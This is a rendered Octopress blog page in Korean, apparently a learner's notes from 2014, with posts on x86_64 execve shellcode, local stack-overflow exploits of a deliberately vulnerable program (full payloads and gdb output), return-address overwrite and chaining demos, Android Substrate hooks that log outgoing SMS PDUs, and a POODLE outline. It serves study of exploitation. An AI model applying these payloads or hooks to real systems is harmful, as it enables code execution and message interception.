@@ -1,0 +1,1046 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>My Octopress Blog</title>
+  <meta name="author" content="Your Name">
+
+  
+  <meta name="description" content="vic.c 이제 vulnerable 한 실행화일을 외부에서 exploit 해보자. 일단 우분투에서 echo 0 | sudo tee /proc/sys/kernel/randomize_va_space 커맨드로 ASLR 을 끄고, -fno-stack-protector -z &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://yoursite.com/posts/10/">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="My Octopress Blog" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="/javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">My Octopress Blog</a></h1>
+  
+    <h2>A blogging framework for hackers.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="sitesearch" value="yoursite.com">
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div class="blog-index">
+  
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/10/linux-x86-64-shellcode-5/">Linux X86_64 Shellcode 5</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-10T22:26:30+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>10:26 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h5>vic.c</h5>
+
+<p>이제 vulnerable 한 실행화일을 외부에서 exploit 해보자.</p>
+
+<p>일단 우분투에서 <code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code> 커맨드로 ASLR 을 끄고, <code>-fno-stack-protector -z execstack</code> 으로 취약한 executable 을 만든다.</p>
+
+<pre><code>unsigned long esp(void)
+{
+    __asm__("mov %rsp,%rax");
+}
+void main(int ac, char **av)
+{
+    char arr[512];
+    if (ac &gt; 1) {
+        printf("address of arr: %lx\n",&amp;arr);
+        printf("esp: %lx\n",esp());
+        strcpy(arr, av[1]);
+    }
+}
+
+# echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
+$ gcc -fno-stack-protector -z execstack -o vic vic.c
+</code></pre>
+
+<h5>Smash!</h5>
+
+<p>이제 터뜨려본다.</p>
+
+<pre><code>z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0480x\x70\xdc\xff\xff\xff\x7f\x00\x00" 0)
+address of arr: 7fffffffdc70
+esp: 7fffffffdc50
+z@ubuntu:~/shell$
+</code></pre>
+
+<p>arr 의 주소는 <code>0x7fffffffdc70</code> 이었다. 아무일 없다.</p>
+
+<p>482 시도</p>
+
+<pre><code>z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0482x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
+address of arr: 7fffffffdc60
+esp: 7fffffffdc40
+Segmentation fault (core dumped)
+</code></pre>
+
+<p>이번에는 arr 의 주소가 <code>0x7fffffffdc60</code> 으로 바뀌었다.
+coredump 가 난다.
+<code>return address</code> 를 <code>0x007fffffffdc60</code> 으로 overwrite 하기로 한다. arg 의 마지막을 <code>\x60\xdc\xff\xff\xff\x7f\x00\x00</code> 로 맞춰준다. arg 의 첫부분은 shellcode 로 맞춰준다. 가운데의 <code>\%0482x</code> 으로 길이를 조절한다.</p>
+
+<p>485 시도</p>
+
+<pre><code>z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0485x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
+address of arr: 7fffffffdc60
+esp: 7fffffffdc40
+Segmentation fault (core dumped)
+</code></pre>
+
+<p>486 시도</p>
+
+<pre><code>z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0486x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
+address of arr: 7fffffffdc60
+esp: 7fffffffdc40
+Segmentation fault (core dumped)
+</code></pre>
+
+<p>487 시도</p>
+
+<pre><code>z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0487x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
+address of arr: 7fffffffdc60
+esp: 7fffffffdc40
+$
+</code></pre>
+
+<p>터졌다.</p>
+
+<p>code 를 수정해, rbp,rsp, arr 를 덤프해서 주소들을 비교해보았다.</p>
+
+<pre><code>z@ubuntu:~/shell$ ./vic $(printf "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05%0487x\x60\xdc\xff\xff\xff\x7f\x00\x00" 0)
+address of arr: 7fffffffdc60 &lt;- main 에 있는 arr 주소
+rsp: 7fffffffdc40 &lt;- subfunction 의 %rsp
+arr dump: &lt;- arr 에 shellcode 가 제대로 적재되었는가?
+48 &lt;- xor %rdx,%rdx
+31
+d2
+got it! 7fffffffde68 &lt;- \x60\xdc\xff\xff\xff\x7f\x00\x00 이 있는 주소
+7fffffffde60: 3030303030303030 &lt;- saved %rbp 가 '0' 으로 뭉개졌다
+7fffffffde68: 00007fffffffdc60 &lt;- address of arr 로 overwrite 되었다
+7fffffffde70: 0000000000000000
+7fffffffde78: 00007fffffffdf48
+7fffffffde60: 00007fffffffde60 &lt;- %rbp 를 덤프해보았다
+$ 
+
+00007fffffffde68 &lt;- return address of main()
+00007fffffffde60 &lt;- %rbp
+00007fffffffdc60 &lt;- start of 'arr' (0x200 bytes)
+00007fffffffdc40 &lt;- subfunction frame 이 셋업되고 그 %rsp
+</code></pre>
+
+<h5>참고</h5>
+
+<ul>
+<li><a href="http://askubuntu.com/questions/318315/how-can-i-temporarily-disable-aslr-address-space-layout-randomization">How can I temporarily disable ASLR (Address space layout randomization)?</a></li>
+<li><a href="http://stackoverflow.com/questions/5863252/disabling-stack-smashing-protection-in-ubuntu-11-04">Disabling Stack Smashing Protection in Ubuntu 11.04</a></li>
+<li><a href="http://stackoverflow.com/questions/23276488/why-is-execstack-required-to-execute-code-on-the-heap">Why is execstack required to execute code on the heap?</a></li>
+<li><a href="http://www.exploit-db.com/papers/24085/">Stack Smashing On A Modern Linux System</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/10/linux-x86-64-shellcode-4/">Linux X86_64 Shellcode 4</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-10T01:54:46+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:54 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>이번에는 쉘코드를 2 개로 나누어서, 첫번째는 <code>retq</code> 로 끊는다. <code>return address</code> 2 개를 적재하여, <code>retq</code> 로 두번쨰 gadget 이 실행되도록 한다. 첫번째 <code>_shellcode</code> 의 <code>\xc3</code> 이 <code>retq</code> 이다.</p>
+
+<pre><code>char *_shellcode = ""
+    "\x48\x31\xd2"
+    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
+    "\x48\xc1\xeb\x08"
+    "\xc3"; // retq
+
+char *_shellcode2 = ""
+    "\x53"
+    "\x48\x89\xe7"
+    "\x48\x31\xc0" // xor %rax,%rax
+    "\x50"
+    "\x57"
+    "\x48\x89\xe6"
+    "\xb0\x3b"
+    "\x0f\x05" ;
+
+
+void explode() {
+    long *ret;
+    ret = (long *)&amp;ret;
+    ret++; // pass local variable
+    ret++; // pass %rbp
+    *ret = _shellcode;
+    ret++;
+    *ret = _shellcode2;
+}
+
+main()
+{
+    explode();
+}
+
+z@ubuntu:~/shells% ./rop
+$
+</code></pre>
+
+<h4>참고</h4>
+
+<ul>
+<li><a href="https://cseweb.ucsd.edu/~hovav/dist/rop.pdf">Return-Oriented Programming: Systems, Languages, and Applications</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/10/linux-x86-64-shellcode-3/">Linux X86_64 Shellcode 3</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-10T01:41:33+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>10</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>1:41 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>이번에는 계산해서 <code>return address</code> 를 덮어쓰는 것이 아니라, 80 바이트정도로 스택 프레임을 밀어본다. 그래도 동작한다.</p>
+
+<pre><code>char *_shellcode = ""
+    "\x48\x31\xd2"
+    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
+    "\x48\xc1\xeb\x08"
+    "\x53"
+    "\x48\x89\xe7"
+    "\x48\x31\xc0"
+    "\x50"
+    "\x57"
+    "\x48\x89\xe6"
+    "\xb0\x3b"
+    "\x0f\x05" ;
+
+char *_shells[10];
+
+void explode() {
+    long *ret;
+    memcpy(&amp;ret,_shells,8*10);
+}
+
+main()
+{
+    int i;
+    for (i=0;i&lt;10;i++) _shells[i]=_shellcode;
+    explode();
+}
+
+z@ubuntu:~/shells% gcc s3.c -o s3
+z@ubuntu:~/shells% ./s3
+$ 
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/09/linux-x86-64-shellcode-2/">Linux X86_64 Shellcode 2</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-09T15:32:12+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>9</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:32 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p>callee 스택을 파괴하는 예제를 짜보았다.</p>
+
+<p>callee stackframe 에서 return address 를 <code>_shellcode</code> 의 어드레스로 바꿔서 <code>retq</code> 가 실행될때 저기로 튀도록 한다.</p>
+
+<pre><code>char *_shellcode = ""
+    "\x48\x31\xd2"      /* xor rdx,rdx */
+    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"  /* mov qword rbx, '//bin/sh' */
+    "\x48\xc1\xeb\x08"  /* shr rbx,0x8 */
+    "\x53"              /* push rbx */
+    "\x48\x89\xe7"      /* mov rdi,rsp */
+    "\x48\x31\xc0"      /* xor rax,rax */
+    "\x50"              /* push rax */
+    "\x57"              /* push rdi */
+    "\x48\x89\xe6"      /* mov rsi,rsp */
+    "\xb0\x3b"          /* mov al,0x3b */
+    "\x0f\x05" ;        /* syscall */
+
+void explode() {
+    long *ret;
+    ret = (long *)&amp;ret;
+#if 1
+    ret++; // now points saved %rbp
+    ret++; // now points return address
+#else
+    __asm__(
+    "add $16,%rax\n\t"
+    "mov %rax, -0x8(%rbp)\n\t"
+    );
+#endif
+    *ret = _shellcode;
+}
+
+main()
+{
+    explode();
+}
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/08/linux-x86-64-shellcode/">Linux X86_64 Shellcode</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-08T15:49:47+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>8</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>3:49 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><p><a href="http://www.exploit-db.com/exploits/13691">Linux x86_64 shellcode</a></p>
+
+<pre><code>section .text
+    global _start
+_start:
+    xor rdx,rdx
+    mov qword rbx, '//bin/sh'
+    shr rbx,0x8
+    push rbx
+    mov rdi,rsp
+    xor rax,rax
+    push rax
+    push rdi
+    mov rsi,rsp
+    mov al,0x3b
+    syscall
+
+int main(void)
+{
+    //void (*p)();
+    char *shellcode = ""
+        "\x48\x31\xd2"
+        "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"
+        "\x48\xc1\xeb\x08"
+        "\x53"
+        "\x48\x89\xe7"  /* mov rdi,rsp */
+        "\x48\x31\xc0"  /* xor rax,rax */
+        "\x50"          /* push rax */
+        "\x57"
+        "\x48\x89\xe6"
+        "\xb0\x3b"
+        "\x0f\x05" ;
+
+    //p = (void(*)()) shellcode;
+    //(*p)();
+    (*(void(*)())shellcode)()
+}
+
+$ gcc -g a.c
+$ gdb a.out
+(gdb) break 18
+Breakpoint 1 at 0x4004c4: file a.c, line 18.
+(gdb) run
+Starting program: /home/z/shell/a.out
+warning: no loadable section found in added symbol-file system-supplied DSO at 0x7ffff7ffa000
+
+Breakpoint 1, main() at a.c:18
+18          (*(void(*)())shellcode)();
+(gdb) disassemble
+Dump of assembler code for function main:
+   0x00000000004004b4 &lt;+0&gt;:     push   %rbp
+   0x00000000004004b5 &lt;+1&gt;:     mov    %rsp,%rbp
+   0x00000000004004b8 &lt;+4&gt;:     sub    $0x10,%rsp
+   0x00000000004004bc &lt;+8&gt;:     movq   $0x4005d0,-0x8(%rbp)
+=&gt; 0x00000000004004c4 &lt;+16&gt;:    mov    -0x8(%rbp),%rdx
+   0x00000000004004c8 &lt;+20&gt;:    mov    $0x0,%eax
+   0x00000000004004cd &lt;+25&gt;:    callq  *%rdx
+   0x00000000004004cf &lt;+27&gt;:    leaveq
+   0x00000000004004d0 &lt;+28&gt;:    retq
+End of assembler dump.
+(gdb) x $rbp-0x8
+0x7fffffffe038: 0x004005d0
+</code></pre>
+
+<p>0x004005d0 부터 shellcode 가 들어있는 것을 확인</p>
+
+<p><code>movabs $0x68732f6e69622f2f,%rbx</code> 로 <code>//bin/sh</code> 을 <code>%rbx</code> 에 집어넣고,
+, 오른쪽으로 8 bit shift 해서,
+<code>/bin/sh\x00</code> 을 만든다.</p>
+
+<p>그리고, 이를 push 해서, 메모리에</p>
+
+<pre><code>00 NULL  &lt;-- High
+68 'h'
+73 's'
+2f '/'
+6e 'n'
+69 'i'
+62 'b'
+2f '/'   &lt;-- Low (%rsp)
+</code></pre>
+
+<p>를 만든다.</p>
+
+<p><a href="https://filippo.io/linux-syscall-table">Searchable Linux Syscall Table for x86 and x86_64</a> 에서 64-bit 를 참조.</p>
+
+<pre><code>Instruction: `syscall`
+Return value found in: `%rax`
+rax: system call number
+rdi: name 
+rsi: argv 
+rdx: envp
+</code></pre>
+
+<p><code>0x3b</code> 는 execve 로 <code>linux/fs/exec.c</code> 에 구현되어있다. <code>syscall</code> 인터페이스는 <code>arch/x86_64/kernel/entry.S</code> 를 보면 된다.</p>
+
+<pre><code>/*
+ * execve(). This function needs to use IRET, not SYSRET, to set up all state properly.
+ *
+ * C extern interface:
+ *       extern long execve(char *name, char **argv, char **envp)
+ *
+ * asm input arguments:
+ *      rdi: name, rsi: argv, rdx: envp
+ *
+ * We want to fallback into:
+ *      extern long sys_execve(char *name, char **argv, char **envp, struct pt_regs regs)
+ *
+ * do_sys_execve asm fallback arguments:
+ *      rdi: name, rsi: argv, rdx: envp, fake frame on the stack
+ */
+ENTRY(execve)
+        FAKE_STACK_FRAME $0
+        SAVE_ALL
+        call sys_execve
+        movq %rax, RAX(%rsp)
+        RESTORE_REST
+        testq %rax,%rax
+        je int_ret_from_sys_call
+        RESTORE_ARGS
+        UNFAKE_STACK_FRAME
+        ret
+</code></pre>
+
+<p><code>arch/x86/kernel/process_64.c</code> 에 sys_execve() 가 있고, 이게</p>
+
+<pre><code>/*
+ * sys_execve() executes a new program.
+ */
+asmlinkage
+long sys_execve(const char __user *name, const char __user *const __user *argv, const char __user *const __user *envp)
+</code></pre>
+
+<p><code>/fs/exec.c</code> 에 있는 <code>do_execve()</code> 를 호출한다. <a href="http://git.kernel.org/cgit/linux/kernel/git/torvalds/linux.git/tree/fs/exec.c">fs/exec.c</a></p>
+
+<pre><code>/*
+ * linux/fs/exec.c
+ */
+...
+int do_execve(struct filename *filename,
+        const char __user *const __user *__argv,
+        const char __user *const __user *__envp)
+{
+    struct user_arg_ptr argv = { .ptr.native = __argv };
+    struct user_arg_ptr envp = { .ptr.native = __envp };
+    return do_execve_common(filename, argv, envp);
+}
+</code></pre>
+
+<p>이제 다시 shellcode 를 disassemble 해본다.</p>
+
+<pre><code>Instruction: `syscall`
+Return value found in: `%rax`
+rax: system call number
+rdi: name 
+rsi: argv 
+rdx: envp
+</code></pre>
+
+<p><code>%rdx</code> 를 0 으로 만들었다.</p>
+
+<pre><code>=&gt; 0x00000000004005d0:  xor    %rdx,%rdx
+</code></pre>
+
+<p>이 세 인스트럭션으로 메모리에 <code>/bin/sh\x00</code> 을 깔았다.</p>
+
+<pre><code>   0x00000000004005d3:  movabs $0x68732f6e69622f2f,%rbx
+   0x00000000004005dd:  shr    $0x8,%rbx
+   0x00000000004005e1:  push   %rbx
+</code></pre>
+
+<p>이제 이 메모리 주소를 <code>%rdi</code> 에 셋업한다. <code>name</code> 이 된다. <code>do_execve(name,...)</code></p>
+
+<pre><code>   0x00000000004005e2:  mov    %rsp,%rdi
+</code></pre>
+
+<p>이제 <code>%rsi</code> 에 argv 를 셋업한다. 이해가 안가는 곳은 <code>push %rax</code> 이다. 항상 0 이 될 수 있을까? 이걸 수정해서 새버전을 만들었다. <code>xor %rax,%rax</code> 를 <code>push %rax</code> 전에 넣으면 된다.</p>
+
+<pre><code>   0x00000000004005e5:  push   %rax  ; argv[1] : NULL pointer
+   0x00000000004005e6:  push   %rdi  ; argv[0] : pointer to '/bin/sh\0'
+   0x00000000004005e7:  mov    %rsp,%rsi ; %rsi points argv[0]
+</code></pre>
+
+<p>이제 <code>%rdx (envp)</code> 는 NULL, <code>%rsi</code> 는 argv[0], <code>%rdi</code> 는 filename 이 셋업되었다.</p>
+
+<p><code>%ax</code> 에 <code>execve</code> 를 넣고 syscall 을 수행한다.</p>
+
+<pre><code>(gdb) x 0x004005d0
+0x4005d0:       0x48d23148
+(gdb) stepi
+...
+(gdb) stepi
+(gdb) disassemble $rdx,+30
+Dump of assembler code from 0x4005d0 to 0x4005ee:
+=&gt; 0x00000000004005d0:  xor    %rdx,%rdx
+   0x00000000004005d3:  movabs $0x68732f6e69622f2f,%rbx
+   0x00000000004005dd:  shr    $0x8,%rbx
+   0x00000000004005e1:  push   %rbx
+   0x00000000004005e2:  mov    %rsp,%rdi
+   0x00000000004005e5:  push   %rax
+   0x00000000004005e6:  push   %rdi
+   0x00000000004005e7:  mov    %rsp,%rsi
+   0x00000000004005ea:  mov    $0x3b,%al
+   0x00000000004005ec:  syscall
+End of assembler dump.
+(gdb)
+</code></pre>
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/07/android-toolchain/">Android Toolchain</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-07T09:13:52+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>7</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>9:13 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>Android Toolchain</h4>
+
+<p>from the book, &ldquo;Android Hacker&rsquo;s Handbook&rdquo;</p>
+
+<ul>
+<li>Debootstrap</li>
+<li>Linaro</li>
+<li>RVDS - ARM&rsquo;s official compiler toolchain is commercial but evaluation copies are available.</li>
+<li>Sourcery - Formerly Sourcery G++, Mentor Graphics&rsquo;s toolchain is available in evaluation, commercial, and Lite editions.</li>
+<li>Android NDK</li>
+<li>AOSP Prebuilt - The Android Open Source Project repository includes a prebuilt toolchain that is used to build AOSP firmware images.</li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/11/03/substrate-for-android/">Substrate for Android</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-11-03T10:40:38+09:00'><span class='date'><span class='date-month'>Nov</span> <span class='date-day'>3</span><span class='date-suffix'>rd</span>, <span class='date-year'>2014</span></span> <span class='time'>10:40 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><h4>Tools</h4>
+
+<ul>
+<li><a href="http://repo.xposed.info">Xposed Framework</a></li>
+<li><a href="http://www.cydiasubstrate.com">Cydia Substrate</a></li>
+<li><a href="http://www.cycript.org">Cycript</a></li>
+<li><a href="https://github.com/crmulliner/">ddi/adbi</a></li>
+<li><a href="http://www.frida.re">Frida</a></li>
+</ul>
+
+
+<h4>References</h4>
+
+<ul>
+<li><a href="https://github.com/Fuzion24/JustTrustMe">JustTrustMe: SSL Pinning kill switch</a></li>
+<li><a href="https://github.com/M66B/XPrivacy">XPrivacy</a></li>
+<li><a href="https://github.com/iSECPartners/Introspy-iOS">iSECPartners Introspy-iOS </a></li>
+</ul>
+
+
+<h4>Cydia Substrate</h4>
+
+<p>우선 Violet example. Substrate 를 깔고, violet.apk 를 설치하면 일부 시스템 메시지들이 색이 violet 으로 바뀐다. Build 가 잘 안되면, SDK 폴더 밑에 있는 <code>saurikit/cydia_substrate/substrate-api.jar</code> 화일을 프로젝트 폴더로 카피.</p>
+
+<h4>AndroidManifest.xml</h4>
+
+<pre><code>&lt;?xml version="1.0" encoding="utf-8" standalone="no"?&gt;
+&lt;manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.saurik.android.violetexample"&gt;
+    &lt;application android:label="@string/app_name"&gt;
+        &lt;meta-data android:name="com.saurik.substrate.main" android:value=".Main"/&gt;
+    &lt;/application&gt;
+    &lt;uses-permission android:name="cydia.permission.SUBSTRATE"/&gt;
+&lt;/manifest&gt;
+</code></pre>
+
+<h4>Main.java</h4>
+
+<pre><code>package com.saurik.android.violetexample;
+import android.util.Log;
+import java.lang.reflect.Method;
+import android.content.res.Resources;
+import com.saurik.substrate.MS;
+import com.saurik.substrate.MS.ClassLoadHook;
+import com.saurik.substrate.MS.MethodAlteration;
+
+public class Main {
+    public static void initialize() {
+        Log.d("HOOK", "hook initialized");
+
+        MS.hookClassLoad("android.content.res.Resources", new ClassLoadHook() {
+            public void classLoaded(Class Resources) {
+                try {
+                    MS.hookMethod(Resources, Resources.getDeclaredMethod("getColor", new Class[]{Integer.TYPE}),
+                        new MethodAlteration&lt;Resources, Integer&gt;() {
+                            public Integer invoked(Resources resources, Object... args) throws Throwable {
+                                return Integer.valueOf((((Integer) invoke(resources, args)).intValue() &amp; 
+                                    ~0x0000ff00) | 0x00ff0000);
+                            }
+                        });
+                } catch (NoSuchMethodException e) {
+                }
+            }
+        });
+    }
+}
+</code></pre>
+
+<h4>com.android.internal.telephony.gsm.SmsMessage</h4>
+
+<p>이제 pdu 를 캡쳐해보자.</p>
+
+<pre><code>public class Main {
+    public static void initialize() {
+        MS.hookClassLoad("com.android.internal.telephony.gsm.SmsMessage", new MS.ClassLoadHook() {
+            public void classLoaded(Class&lt;?&gt; smsMessage) {
+                Method getSubmitPdu;
+                try {
+                    getSubmitPdu = smsMessage.getMethod("getSubmitPdu",
+                        String.class,
+                        String.class,
+                        String.class,
+                        Boolean.TYPE,
+                        byte[].class,
+                        Integer.class,
+                        Integer.class,
+                        Integer.class,
+                        Integer.class
+                        );
+                } catch (NoSuchMethodException e) { getSubmitPdu = null; }
+                if (getSubmitPdu != null) {
+                    final MS.MethodPointer old = new MS.MethodPointer();
+                    MS.hookMethod(smsMessage, getSubmitPdu, new MS.MethodHook() {
+                        public Object invoked(Object smsMessage, Object... args) throws Throwable {
+                            Object submitPdu;
+                            submitPdu = old.invoke(smsMessage, args);
+                            try {
+                                Field field;
+                                field = submitPdu.getClass().getSuperclass().getDeclaredField("encodedMessage");
+                                field.setAccessible(true);
+                                if (field.getType() == byte[].class) {
+                                    Object val = field.get(submitPdu);
+                                    Log.d("Substrate", "pdu: " + this.bytesToHex((byte []) val));
+                                }
+                            } catch (Exception e) {
+                                Log.e("Substrate", "Error in Hook_getSubmitPdu. " + e.toString());
+                            }
+                            return submitPdu;
+                        }
+                    }, old);
+                }
+            } 
+        });
+    }
+}
+</code></pre>
+
+<p>추가로, pdu 를 교체하는 것도 가능하다.</p>
+
+<h5>SELinux</h5>
+
+<ul>
+<li><a href="http://forum.xda-developers.com/showthread.php?t=2466101&amp;page=3">Saurik&rsquo;s post</a></li>
+<li><a href="http://forum.xda-developers.com/showthread.php?t=2524485">SELinuxModeChanger</a></li>
+</ul>
+
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/10/24/shellshock/">Shellshock</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-10-24T09:10:49+09:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>9:10 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content">
+</div>
+  
+  
+
+
+    </article>
+  
+  
+    <article>
+      
+  <header>
+    
+      <h1 class="entry-title"><a href="/blog/2014/10/18/sslv3-poodle-attack/">SSLv3 POODLE Attack</a></h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-10-18T09:20:32+09:00'><span class='date'><span class='date-month'>Oct</span> <span class='date-day'>18</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>9:20 am</span></time>
+        
+      </p>
+    
+  </header>
+
+
+  <div class="entry-content"><ul>
+<li>Adam Langley 의 <a href="https://www.imperialviolet.org/2014/10/14/poodle.html">POODLE Attacks on SSLv3</a></li>
+<li>Matthew Green 의 <a href="http://blog.cryptographyengineering.com/2014/10/attack-of-week-poodle.html">Attack of the week: POODLE</a></li>
+<li>Bodo Möller, Thai Duong, Krzysztof Kotowicz 의 <a href="https://www.openssl.org/~bodo/ssl-poodle.pdf">This POODLE Bites: Exploiting The SSL 3.0 Fallback</a></li>
+</ul>
+
+
+<p>을 읽고 정리해본다.</p>
+
+<h4>Objective</h4>
+
+<ul>
+<li>공격의 목표는 HTTP header 의 cookie 를 읽어서, facebook.com 에 로그인할 수 있는 세션아이디를 알아내는 것이라고 하자.</li>
+</ul>
+
+
+<h4>Assumptions</h4>
+
+<ul>
+<li>Man-in-the-middle 포지션을 가지고 있어야 한다.</li>
+<li>Victim 브라우저에 JavaScript 을 돌릴 수 있어야 한다.</li>
+<li>Fallback 을 시키든 어떻게든 SSLv3 로 다운그레이딩시킬 수 있다고 가정한다. 그리고 block cipher 는 CBC 모드를 쓴다고 가정.</li>
+<li>facebook.com 은 그냥 예일뿐이다. 이 버그를 가지고 있는지 없는지 모른다.</li>
+</ul>
+
+
